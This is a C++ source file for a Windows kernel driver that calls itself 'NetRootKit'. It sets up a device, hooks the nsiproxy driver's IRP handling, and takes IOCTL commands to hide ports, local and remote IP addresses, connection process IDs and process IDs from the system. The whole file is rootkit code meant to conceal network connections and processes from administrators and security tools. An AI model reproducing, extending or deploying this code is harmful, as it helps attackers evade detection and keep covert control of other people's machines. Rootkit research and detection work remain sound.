#include <Ntifs.h>
#include "Public.h"
#include <Ntstrsafe.h>
#include "IoctlHandlers.h"
#include "NetworkHook.h"

void NetRootkitUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS NetRootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS NetRootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp);

extern "C" NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	KdPrint(("Rootkit DriverEntry started\n"));

	DriverObject->DriverUnload = NetRootkitUnload;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = NetRootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = NetRootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NetRootkitDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\NetRootKit");

	PDEVICE_OBJECT DeviceObject;

	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device (0x%08X)\n", status));
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\NetRootKit");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	DriverObject->Flags &= ~DO_DEVICE_INITIALIZING;
	DeviceObject->Flags |= DO_BUFFERED_IO;

	//init IRP hook for the nsiproxy driver
	NetHook::InitNetworkHook();

	KdPrint(("Rootkit DriverEntry completed successfully\n"));

	return STATUS_SUCCESS;
}

void NetRootkitUnload(_In_ PDRIVER_OBJECT DriverObject) {

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\NetRootKit");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	//remove nsiproxy IRP hook
	NetHook::UnHookNetworkProxy();

	KdPrint(("Rootkit unloaded\n"));
}


NTSTATUS NetRootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);


	KdPrint(("Rootkit create/close\n"));

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);


	return STATUS_SUCCESS;
}


NTSTATUS NetRootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp) {

	auto IrpStack = IoGetCurrentIrpStackLocation(Irp);
	Irp->IoStatus.Status = STATUS_SUCCESS;

	NTSTATUS status{ STATUS_SUCCESS };
	switch (static_cast<RookitIoctls>(IrpStack->Parameters.DeviceIoControl.IoControlCode)) 
	{
	case RookitIoctls::TestConnection:

		status = IoctlHandlers::HandleTestConnection(Irp, IrpStack->Parameters.DeviceIoControl.OutputBufferLength);
		break;

	case RookitIoctls::HidePort:

		status = IoctlHandlers::HandleHidePort(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case RookitIoctls::HideIP:
		
		status = IoctlHandlers::HandleHideIP(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case RookitIoctls::HideRemoteIP:

		status = IoctlHandlers::HandleHideRemoteIP(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case RookitIoctls::HideConnectProcessId:

		status = IoctlHandlers::HandleHideConnectPID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case RookitIoctls::HideProcessId:

		status = IoctlHandlers::HandleHidePID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	default:
		Irp->IoStatus.Information = 0;
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;

	}

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
